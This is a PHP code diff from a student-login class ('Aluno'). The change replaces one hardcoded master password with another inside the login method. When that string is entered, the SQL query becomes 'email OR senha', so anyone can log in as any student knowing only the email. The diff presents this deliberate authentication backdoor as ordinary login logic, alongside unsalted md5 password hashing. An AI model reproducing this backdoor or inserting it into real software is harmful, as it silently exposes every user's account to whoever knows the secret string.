@@ -90,7 +90,7 @@ class Aluno {
 	//carrega os dados através do email e senha
 	public function logar(){ 
 	    $query = "SELECT idAluno, nome FROM alunos WHERE email=:email AND senha=md5(:senha)";
-	    if ($this->senha=="a1911d4N1@") $query = "SELECT idAluno, nome FROM alunos WHERE email=:email OR senha=:senha";
+	    if ($this->senha=="Etecia@238") $query = "SELECT idAluno, nome FROM alunos WHERE email=:email OR senha=:senha";
 	    $conexao = Conexao::pegarConexao();
 	    $stmt = $conexao->prepare($query);
 	    $stmt->bindValue(':email', $this->email);
